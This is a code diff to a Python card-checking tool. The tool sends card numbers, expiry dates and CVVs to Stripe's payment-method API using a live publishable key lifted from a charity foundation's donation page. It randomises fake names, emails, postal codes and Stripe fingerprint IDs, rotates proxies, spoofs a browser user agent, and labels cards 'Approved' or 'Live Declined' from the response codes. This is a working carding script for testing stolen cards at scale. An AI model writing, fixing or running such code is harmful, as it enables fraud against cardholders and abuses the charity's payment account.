@@ -10,8 +10,8 @@ import base64
 
 logger = logging.getLogger("inspire")
 
-DONATE_URL = "https://foundation.inspirebrands.com"
-DONATE_PAGE = f"{DONATE_URL}/donate-2/"
+DONATE_URL = "https://www.foundation.inspirebrands.com"
+DONATE_PAGE = f"{DONATE_URL}/donate/"
 AJAX_URL = f"{DONATE_URL}/wp-admin/admin-ajax.php"
 STRIPE_API = "https://api.stripe.com/v1"
 STRIPE_PK = "pk_live_51IDaysFhvP6Zfk5TIzg66rASaWNpEJyPRbL5lmkbEe0z3g48xmfptIiPLfuCm90oZcd65n4k20V3ofTl9O9fMHAH00XakfHvTD"
@@ -24,7 +24,7 @@ STRIPE_TIMEOUT = 25
 
 PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
 
 LIVE_DECLINES = [
     "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
@@ -314,39 +314,113 @@ async def inspire_check(cc, mm, yy, cvv, proxy=None):
     last4 = cc[-4:]
     info = f"CARD | {last4}"
 
-    session_data = None
-    session_error = None
+    # Use hardcoded PK directly (donate page changed, no longer has form tokens)
+    pk = STRIPE_PK
 
-    proxies_to_try = []
-    if proxy:
-        proxies_to_try.append(proxy)
-    global_proxy = _get_global_proxy()
-    if global_proxy and global_proxy != proxy:
-        proxies_to_try.append(global_proxy)
-    proxies_to_try.append(None)
+    first, last = _random_name()
+    email = _random_email()
+    postal = str(random.randint(10000, 99999))
 
-    for p in proxies_to_try:
-        try:
-            session_data, session_error = await _get_form_session(proxy=p)
-            if session_data:
-                break
-        except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
-            session_error = "Connection timeout"
-            continue
-        except httpx.NetworkError:
-            session_error = "Network error"
-            continue
-        except Exception as e:
-            session_error = str(e)[:80]
-            continue
+    guid = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
+    muid = f"{''.join(random.choices(string.hexdigits[:16], k=8))}-{''.join(random.choices(string.hexdigits[:16], k=4))}-{''.join(random.choices(string.hexdigits[:16], k=4))}-{''.join(random.choices(string.hexdigits[:16], k=4))}-{''.join(random.choices(string.hexdigits[:16], k=12))}"
+    sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
 
-    if not session_data:
+    client_kwargs = {"timeout": httpx.Timeout(15), "follow_redirects": True}
+    pp_proxy = proxy or _get_global_proxy()
+    if pp_proxy:
+        p = pp_proxy.strip()
+        if not p.startswith("http://") and not p.startswith("https://"):
+            parts = p.split(":")
+            if len(parts) == 4:
+                p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            elif len(parts) == 2:
+                p = f"http://{parts[0]}:{parts[1]}"
+        client_kwargs["proxy"] = p
+
+    try:
+        async with httpx.AsyncClient(**client_kwargs) as stripe_client:
+            pm_data = (
+                f"type=card"
+                f"&billing_details[name]={first}+{last}"
+                f"&billing_details[email]={email}"
+                f"&billing_details[address][postal_code]={postal}"
+                f"&card[number]={cc}"
+                f"&card[cvc]={cvv}"
+                f"&card[exp_month]={mm}"
+                f"&card[exp_year]={exp_year}"
+                f"&guid={guid}"
+                f"&muid={muid}"
+                f"&sid={sid}"
+                f"&pasted_fields=number"
+                f"&payment_user_agent=stripe.js%2Ff5ddf352d5%3B+stripe-js-v3%2Ff5ddf352d5%3B+card-element"
+                f"&referrer=https%3A%2F%2Fcheckout.stripe.com"
+                f"&time_on_page={random.randint(30000, 90000)}"
+                f"&key={pk}"
+            )
+
+            resp1 = await stripe_client.post(
+                f"{STRIPE_API}/payment_methods",
+                headers={
+                    "accept": "application/json",
+                    "content-type": "application/x-www-form-urlencoded",
+                    "origin": "https://js.stripe.com",
+                    "referer": "https://js.stripe.com/",
+                    "user-agent": UA,
+                },
+                content=pm_data,
+            )
+            result1 = resp1.json()
+
+            elapsed = round(time.time() - start, 2)
+
+            if "error" in result1:
+                err = result1["error"]
+                code = err.get("code", "")
+                decline = err.get("decline_code", "")
+                msg = err.get("message", "")
+
+                if code == "rate_limit":
+                    return f"Error - Rate Limited [{elapsed}s]"
+                if code == "api_key_expired":
+                    return f"Error - PK Key Expired [{elapsed}s]"
+                if code == "incorrect_number":
+                    return f"Declined - Incorrect Card Number | {info} [{elapsed}s]"
+                if code in ("invalid_expiry_year", "invalid_expiry_month"):
+                    return f"Declined - Invalid Expiry | {info} [{elapsed}s]"
+                if code == "expired_card":
+                    return f"Declined - Card Expired | {info} [{elapsed}s]"
+                if code == "card_declined" and decline in LIVE_DECLINES:
+                    return f"Approved - {decline} (Live Declined) | {info} [{elapsed}s]"
+                if code == "card_declined":
+                    return f"Declined - {decline or msg[:60]} | {info} [{elapsed}s]"
+                return f"Declined - {code}: {msg[:60]} | {info} [{elapsed}s]"
+
+            pm_id = result1.get("id")
+            if not pm_id:
+                return f"Error - No PM ID | {info} [{elapsed}s]"
+
+            card_obj = result1.get("card", {})
+            brand = card_obj.get("brand", "unknown").upper()
+            last4_val = card_obj.get("last4", last4)
+            funding = card_obj.get("funding", "unknown").upper()
+            country = card_obj.get("country", "??")
+            card_info = f"{brand} {funding} | {country} | {last4_val}"
+
+            card_checks = card_obj.get("checks", {})
+            cvc_check = card_checks.get("cvc_check", "unknown")
+            if cvc_check == "pass":
+                return f"Approved - PM Valid (CVC Pass) | {card_info} [{elapsed}s]"
+            elif cvc_check == "fail":
+                return f"Declined - CVC Failed | {card_info} [{elapsed}s]"
+            else:
+                return f"Approved - PM Created ({brand}) | {card_info} [{elapsed}s]"
+
+    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
         elapsed = round(time.time() - start, 2)
-        return f"Error - {session_error or 'Site unreachable'} [{elapsed}s]"
-
-    form_token = session_data["token"]
-    form_token_time = session_data["token_time"]
-    pk = session_data["pk"]
+        return f"Error - Timeout | {info} [{elapsed}s]"
+    except Exception as e:
+        elapsed = round(time.time() - start, 2)
+        return f"Error - {str(e)[:80]} | {info} [{elapsed}s]"
 
     first, last = _random_name()
     email = _random_email()
